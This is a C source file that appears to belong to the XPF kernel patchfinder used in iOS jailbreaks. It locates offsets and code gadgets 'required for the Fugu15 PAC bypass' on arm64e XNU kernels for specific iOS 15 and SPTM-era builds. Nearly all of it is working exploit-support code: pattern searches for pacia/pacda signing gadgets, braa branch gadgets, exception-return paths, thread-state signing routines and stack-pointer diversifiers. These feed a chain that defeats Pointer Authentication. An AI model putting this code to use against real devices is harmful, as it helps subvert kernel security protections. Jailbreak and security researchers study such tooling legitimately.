#include "xpf.h"

// Offsets required for the Fugu15 PAC bypass

bool xpf_bad_recovery_supported(void) {
    if (!gXPF.kernelIsArm64e) {
        // non-PACed devices
        return false;
    }
    if (strcmp(gXPF.darwinVersion, "21.0.0") >= 0 && strcmp(gXPF.darwinVersion, "21.5.0") < 0) {
        // iOS 15.0 - 15.4.1: Supported
        return true;
    } else if ((strcmp(gXPF.xnuBuild, "8020.120.43.112.1~1") == 0)
               || (strcmp(gXPF.xnuBuild, "8020.120.51.122.2~1") == 0)
               || (strcmp(gXPF.xnuBuild, "8020.120.68.132.1~1") == 0)) {
        // iOS 15.5b1 - 15.5b3: Supported
        return true;
    }

    // Anything else: Not supported
    return false;
}

bool xpf_sptm_fugu14_supported(void) {
    return gXPF.kernelIsArm64e && strcmp(gXPF.darwinVersion, "23.0.0") >= 0 && strcmp(gXPF.darwinVersion, "23.4.0") < 0;
}

static uint64_t xpf_find_hw_lck_ticket_reserve_orig_allow_invalid_signed(void) {
    uint32_t strX10X16Any = 0, strX10X16AnyMask = 0;
    arm64_gen_str_imm(0,
                      LDR_STR_TYPE_UNSIGNED,
                      ARM64_REG_X(10),
                      ARM64_REG_X(16),
                      OPT_UINT64_NONE,
                      &strX10X16Any,
                      &strX10X16AnyMask);

    uint32_t movzW0_0 = 0, movzW0_0Mask = 0;
    arm64_gen_mov_imm('z', ARM64_REG_W(0), OPT_UINT64(0), OPT_UINT64(0), &movzW0_0, &movzW0_0Mask);

    uint32_t inst[] = (uint32_t[]){
        strX10X16Any, // str x10, [x16, ?]
        movzW0_0,     // movz w0, #0
        0xd65f03c0,   // ret
    };
    uint32_t mask[] = (uint32_t[]){
        strX10X16AnyMask,
        movzW0_0Mask,
        0xffffffff,
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), sizeof(uint32_t));
    __block uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        // Filter out anything with a wfe instruction before it
        if (pfsec_read32(gXPF.kernelTextSection, vmaddr - 4) != 0xd503205f /* wfe */) {
            hw_lck_ticket_reserve_orig_allow_invalid_signed = vmaddr;
            *stop = true;
        }
    });
    pfmetric_free(metric);
    return hw_lck_ticket_reserve_orig_allow_invalid_signed;
}

static uint64_t xpf_find_hw_lck_ticket_reserve_orig_allow_invalid(void) {
    uint32_t adrAny = 0, adrAnyMask = 0;
    arm64_gen_adr_p(OPT_BOOL(false), OPT_UINT64_NONE, OPT_UINT64_NONE, ARM64_REG_ANY, &adrAny, &adrAnyMask);

    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed = xpf_item_resolve(
        "kernelGadget.hw_lck_ticket_reserve_orig_allow_invalid_signed");
    XPF_ASSERT(hw_lck_ticket_reserve_orig_allow_invalid_signed);
    return pfsec_find_prev_inst(gXPF.kernelTextSection,
                                hw_lck_ticket_reserve_orig_allow_invalid_signed,
                                40,
                                adrAny,
                                adrAnyMask);
}

static uint64_t xpf_find_br_x22_gadget(void) {
    // Gadget:
    // pacia x22, sp
    // (... some code ...)
    // braa x22, sp

    uint32_t inst[] = (uint32_t[]){
        0xd71f0adf // braa x22, sp
    };

    __block uint64_t brX22Gadget = 0;
    PFPatternMetric *pacMetric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    pfmetric_run(gXPF.kernelTextSection, pacMetric, ^(uint64_t signCandidate, bool *stop) {
        if (xpf_sptm_fugu14_supported()) {
            brX22Gadget = signCandidate;
            *stop = true;
            return;
        }
        uint32_t brX22 = 0xdac103f6; // pacia x22, sp
        uint64_t brX22Addr = pfsec_find_prev_inst(gXPF.kernelTextSection, signCandidate, 50, brX22, 0xffffffff);
        if (brX22Addr) {
            brX22Gadget = brX22Addr;
            *stop = true;
        }
    });
    pfmetric_free(pacMetric);

    return brX22Gadget;
}

static uint64_t xpf_find_pacia_x16_x17_store_x0_gadget(void) {
    uint32_t inst[] = {
        0xdac10230, // pacia x16, x17
        0xf9000010, // str x16, [x0]
        0xd65f03c0, // ret
    };
    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        gadget = vmaddr;
        *stop = true;
    });
    if (!gadget && gXPF.kernelIsFileset) {
        for (uint32_t index = 0; index < gXPF.kernel->filesetCount && !gadget; index++) {
            FilesetMachO *entry = &gXPF.kernel->filesetMachos[index];
            if (!entry->entry_id)
                continue;
            PFSection *section = pfsec_init_from_macho(gXPF.kernel, entry->entry_id, "__TEXT_EXEC", "__text");
            if (!section)
                continue;
            pfmetric_run(section, metric, ^(uint64_t vmaddr, bool *stop) {
                gadget = vmaddr;
                *stop = true;
            });
            pfsec_free(section);
        }
    }
    pfmetric_free(metric);
    return gadget;
}

static uint64_t xpf_find_pacibsp_store_lr_return_gadget(void) {
    uint32_t inst[] = {
        0xd503237f, // pacibsp
        0xa9bf7bfd, // stp x29, x30, [sp, #-0x10]!
        0x910003fd, // mov x29, sp
        0xf9000020, // str x0, [x1]
        0xd2800000, // mov x0, #0
        0x910003bf, // mov sp, x29
        0xa8c17bfd, // ldp x29, x30, [sp], #0x10
        0xd65f0fff, // retab
    };
    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        gadget = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return gadget;
}

static uint64_t xpf_find_pacda_x16_x17_store_x0_gadget(void) {
    uint32_t inst[] = {
        0xdac10a30, // pacda x16, x17
        0xf9000010, // str x16, [x0]
        0xd65f03c0, // ret
    };
    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        gadget = vmaddr;
        *stop = true;
    });
    if (!gadget && gXPF.kernelIsFileset) {
        for (uint32_t index = 0; index < gXPF.kernel->filesetCount && !gadget; index++) {
            FilesetMachO *entry = &gXPF.kernel->filesetMachos[index];
            if (!entry->entry_id)
                continue;
            PFSection *section = pfsec_init_from_macho(gXPF.kernel, entry->entry_id, "__TEXT_EXEC", "__text");
            if (!section)
                continue;
            pfmetric_run(section, metric, ^(uint64_t vmaddr, bool *stop) {
                gadget = vmaddr;
                *stop = true;
            });
            pfsec_free(section);
        }
    }
    pfmetric_free(metric);
    return gadget;
}

static uint64_t xpf_find_thread_kstackptr_diversifier(void) {
    uint32_t inst[] = {
        0x91000023, // add x3, x1, #TH_KSTACKPTR
        0xf9400062, // ldr x2, [x3]
        0xf2e00003, // movk x3, #diversifier, lsl #48
        0xdac11862, // autda x2, x3
    };
    uint32_t mask[] = {
        0xffc003ff,
        0xffffffff,
        0xffe0001f,
        0xffffffff,
    };
    PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), sizeof(uint32_t));
    __block uint64_t diversifier = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        diversifier = (pfsec_read32(gXPF.kernelTextSection, vmaddr + 8) >> 5) & 0xffff;
        *stop = true;
    });
    pfmetric_free(metric);
    return diversifier;
}

static uint64_t xpf_find_str_x0_braa_x16_x17_gadget(void) {
    uint32_t strX0Any = 0, strX0AnyMask = 0;
    arm64_gen_str_imm(0,
                      LDR_STR_TYPE_UNSIGNED,
                      ARM64_REG_X(0),
                      ARM64_REG_ANY,
                      OPT_UINT64_NONE,
                      &strX0Any,
                      &strX0AnyMask);
    uint32_t inst[] = {
        strX0Any,
        0xf9401710,
        0xaa0003e0,
        0xaa0003e1,
        0xaa0003e2,
        0xa9407bfd,
        0xa9404ff4,
        0xa94057f6,
        0xa9405ff8,
        0xa94067fa,
        0xa9406ffc,
        0x910003ff,
        0xd50323ff,
        0xd2800011,
        0xd71f0a11,
    };
    uint32_t mask[] = {
        strX0AnyMask,
        0xffffffff,
        0xffe0ffff,
        0xffe0ffff,
        0xffe0ffff,
        0xffc07fff,
        0xffc07fff,
        0xffc07fff,
        0xffc07fff,
        0xffc07fff,
        0xffc07fff,
        0xffc003ff,
        0xffffffff,
        0xffe0001f,
        0xffffffff,
    };
    PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), sizeof(uint32_t));
    __block uint64_t gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        uint32_t storeBase = (pfsec_read32(gXPF.kernelTextSection, vmaddr) >> 5) & 0x1f;
        if (storeBase == 19 || storeBase == 22) {
            gadget = vmaddr;
            *stop = true;
        }
    });
    pfmetric_free(metric);
    return gadget;
}

static uint64_t xpf_find_exception_return_after_check(void) {
    uint64_t exception_return = xpf_item_resolve("kernelSymbol.exception_return");

    uint32_t inst[] = (uint32_t[]){
        0xaa0303fe, // mov x30, x3
        0xaa1603e3, // mov x3, x22
        0xaa1703e4, // mov x4, x23
        0xaa1803e5  // mov x5, x24
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t exception_return_after_check = 0;
    pfmetric_run_in_range(gXPF.kernelTextSection, exception_return, -1, metric, ^(uint64_t vmaddr, bool *stop) {
        exception_return_after_check = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return exception_return_after_check;
}

static uint64_t xpf_find_exception_return_after_check_no_restore(void) {
    uint64_t exception_return = xpf_item_resolve("kernelSymbol.exception_return");

    uint32_t inst[] = (uint32_t[]){
        0xd5184021 // msr elr_el1, x1
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t exception_return_after_check_no_restore = 0;
    pfmetric_run_in_range(gXPF.kernelTextSection, exception_return, -1, metric, ^(uint64_t vmaddr, bool *stop) {
        exception_return_after_check_no_restore = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return exception_return_after_check_no_restore;
}

static uint64_t xpf_find_ldp_x0_x1_x8_gadget(void) {
    uint32_t inst[] = (uint32_t[]){
        0xa9400500, // ldp x0, x1, [x8]
        0xd65f03c0  // ret
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t ldp_x0_x1_x8_gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        ldp_x0_x1_x8_gadget = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return ldp_x0_x1_x8_gadget;
}

static uint64_t xpf_find_str_x8_x9_gadget(void) {
    uint32_t inst[] = (uint32_t[]){
        0xf9000128, // str x8, [x9]
        0xd65f03c0  // ret
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t str_x8_x9_gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        str_x8_x9_gadget = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return str_x8_x9_gadget;
}

static uint64_t xpf_find_str_x0_x19_ldr_x20_gadget(void) {
    uint32_t ldrAnyX20Any = 0, ldrAnyX20AnyMask = 0;
    arm64_gen_ldr_imm(0,
                      LDR_STR_TYPE_UNSIGNED,
                      ARM64_REG_ANY,
                      ARM64_REG_X(20),
                      OPT_UINT64_NONE,
                      &ldrAnyX20Any,
                      &ldrAnyX20AnyMask);

    uint32_t inst[] = (uint32_t[]){
        0xf9000260,  // str x0, [x19]
        ldrAnyX20Any // ldr x?, [x20, ?]
    };
    uint32_t mask[] = (uint32_t[]){0xffffffff, ldrAnyX20AnyMask};

    PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), sizeof(uint32_t));
    __block uint64_t str_x0_x19_ldr_x20_gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        str_x0_x19_ldr_x20_gadget = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return str_x0_x19_ldr_x20_gadget;
}

static uint64_t xpf_find_pacda_gadget(void) {
    uint32_t inst[] = (uint32_t[]){
        0xf100003f, // cmp x1, #0
        0xdac10921, // pacda x1, x9
        0x9a8103e9, // str x9, [x8]
        0xf9000109, // csel x9, xzr, x1, eq
        0xd65f03c0  // ret
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t pacda_gadget = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        pacda_gadget = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);
    return pacda_gadget;
}

static uint64_t xpf_find_ml_sign_thread_state(void) {
    uint32_t inst[] = (uint32_t[]){
        0x9ac03021, // pacga x1, x1, x0
        0x9262f842, // and x2, x2, #0xffffffffdfffffff
        0x9ac13041, // pacga x1, x2, x1
        0x9ac13061, // pacga x1, x3, x1
        0x9ac13081, // pacga x1, x4, x1
        0x9ac130a1, // pacga x1, x5, x1
        0xf9009401, // str x1, [x0, #0x128]
        0xd65f03c0  // ret
    };

    PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), sizeof(uint32_t));
    __block uint64_t ml_sign_thread_state = 0;
    pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
        ml_sign_thread_state = vmaddr;
        *stop = true;
    });
    pfmetric_free(metric);

    if (!ml_sign_thread_state) {
        uint32_t callSequence[] = {
            0xd5384213,
            0xd50041bf,
            0x94000000,
            0xd5184213,
        };
        uint32_t callMask[] = {
            0xffffffff,
            0xffffffff,
            0xfc000000,
            0xffffffff,
        };
        PFPatternMetric *callMetric = pfmetric_pattern_init(callSequence,
                                                            callMask,
                                                            sizeof(callSequence),
                                                            sizeof(uint32_t));
        pfmetric_run(gXPF.kernelTextSection, callMetric, ^(uint64_t vmaddr, bool *stop) {
            uint64_t target = 0;
            uint64_t callAddress = vmaddr + 8;
            if (arm64_dec_b_l(pfsec_read32(gXPF.kernelTextSection, callAddress), callAddress, &target, NULL) == 0) {
                ml_sign_thread_state = target;
                *stop = true;
            }
        });
        pfmetric_free(callMetric);
    }
    return ml_sign_thread_state;
}

static uint64_t xpf_find_thread_recover(void) {
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed = xpf_item_resolve(
        "kernelGadget.hw_lck_ticket_reserve_orig_allow_invalid_signed");
    XPF_ASSERT(hw_lck_ticket_reserve_orig_allow_invalid_signed);
    uint32_t strInst = pfsec_read32(gXPF.kernelTextSection, hw_lck_ticket_reserve_orig_allow_invalid_signed);
    uint64_t imm = 0;
    arm64_dec_str_imm(strInst, NULL, NULL, &imm, NULL, NULL);
    return imm;
}

static uint64_t xpf_find_thread_machine_kstackptr(void) {
    uint32_t ldrAnyInst = 0, ldrAnyMask = 0;
    arm64_gen_ldr_imm(0,
                      LDR_STR_TYPE_UNSIGNED,
                      ARM64_REG_ANY,
                      ARM64_REG_ANY,
                      OPT_UINT64_NONE,
                      &ldrAnyInst,
                      &ldrAnyMask);

    uint32_t inst[3] = {
        0xd538d08a, // mrs x10, tpidr_el1
        ldrAnyInst, // ldr x?, [x?, TH_KSTACKPTR]
        0xd503233f, // paciasp
    };
    uint32_t mask[3] = {
        0xffffffff,
        ldrAnyMask,
        0xffffffff,
    };

    __block uint64_t machine_kstackptr = 0;
    PFPatternMetric *patternMetric = pfmetric_pattern_init(inst, mask, sizeof(inst), sizeof(uint32_t));
    pfmetric_run(gXPF.kernelTextSection, patternMetric, ^(uint64_t vmaddr, bool *stop) {
        arm64_dec_ldr_imm(pfsec_read32(gXPF.kernelTextSection, vmaddr + 4), NULL, NULL, &machine_kstackptr, NULL, NULL);
        *stop = true;
    });
    pfmetric_free(patternMetric);

    if (!machine_kstackptr) {
        uint32_t inst2[] = {
            0xd538d08a, // mrs x10, tpidr_el1
            ldrAnyInst, // ldr x?, [x?, TH_KSTACKPTR]
        };
        uint32_t mask2[] = {
            0xffffffff,
            ldrAnyMask,
        };

        uint32_t movk_w12_0x4Inst = 0, movk_w12_0x4Mask = 0;
        arm64_gen_mov_imm('k', ARM64_REG_W(12), OPT_UINT64(0x4), OPT_UINT64(0), &movk_w12_0x4Inst, &movk_w12_0x4Mask);

        PFPatternMetric *patternMetric2 = pfmetric_pattern_init(inst2, mask2, sizeof(inst2), sizeof(uint32_t));
        pfmetric_run(gXPF.kernelTextSection, patternMetric2, ^(uint64_t vmaddr, bool *stop) {
            if (pfsec_find_next_inst(gXPF.kernelTextSection, vmaddr, 0x10, movk_w12_0x4Inst, movk_w12_0x4Mask)) {
                arm64_dec_ldr_imm(pfsec_read32(gXPF.kernelTextSection, vmaddr + 4),
                                  NULL,
                                  NULL,
                                  &machine_kstackptr,
                                  NULL,
                                  NULL);
                *stop = true;
            }
        });
        pfmetric_free(patternMetric2);
    }

    return machine_kstackptr;
}

void xpf_bad_recovery_init(void) {
    if (xpf_bad_recovery_supported() || xpf_sptm_fugu14_supported()) {
        xpf_item_register("kernelSymbol.hw_lck_ticket_reserve_orig_allow_invalid",
                          xpf_find_hw_lck_ticket_reserve_orig_allow_invalid,
                          NULL);
        xpf_item_register("kernelGadget.hw_lck_ticket_reserve_orig_allow_invalid_signed",
                          xpf_find_hw_lck_ticket_reserve_orig_allow_invalid_signed,
                          NULL);
        xpf_item_register("kernelGadget.br_x22", xpf_find_br_x22_gadget, NULL);
        xpf_item_register("kernelGadget.exception_return_after_check", xpf_find_exception_return_after_check, NULL);
        xpf_item_register("kernelGadget.str_x8_x9", xpf_find_str_x8_x9_gadget, NULL);
        xpf_item_register("kernelGadget.str_x0_x19_ldr_x20", xpf_find_str_x0_x19_ldr_x20_gadget, NULL);
        xpf_item_register("kernelSymbol.ml_sign_thread_state", xpf_find_ml_sign_thread_state, NULL);
    }
    if (xpf_sptm_fugu14_supported()) {
        xpf_item_register("kernelGadget.pacia_x16_x17_store_x0", xpf_find_pacia_x16_x17_store_x0_gadget, NULL);
        xpf_item_register("kernelGadget.pacda_x16_x17_store_x0", xpf_find_pacda_x16_x17_store_x0_gadget, NULL);
        xpf_item_register("kernelGadget.pacibsp_store_lr_return", xpf_find_pacibsp_store_lr_return_gadget, NULL);
        xpf_item_register("kernelGadget.str_x0_braa_x16_x17", xpf_find_str_x0_braa_x16_x17_gadget, NULL);
        xpf_item_register("kernelConstant.TH_KSTACKPTR_DIVERSIFIER", xpf_find_thread_kstackptr_diversifier, NULL);
    }
    if (xpf_bad_recovery_supported()) {
        xpf_item_register("kernelGadget.exception_return_after_check_no_restore",
                          xpf_find_exception_return_after_check_no_restore,
                          NULL);
        xpf_item_register("kernelGadget.ldp_x0_x1_x8", xpf_find_ldp_x0_x1_x8_gadget, NULL);
        xpf_item_register("kernelGadget.pacda", xpf_find_pacda_gadget, NULL);
        xpf_item_register("kernelStruct.thread.recover", xpf_find_thread_recover, NULL);
    }
}
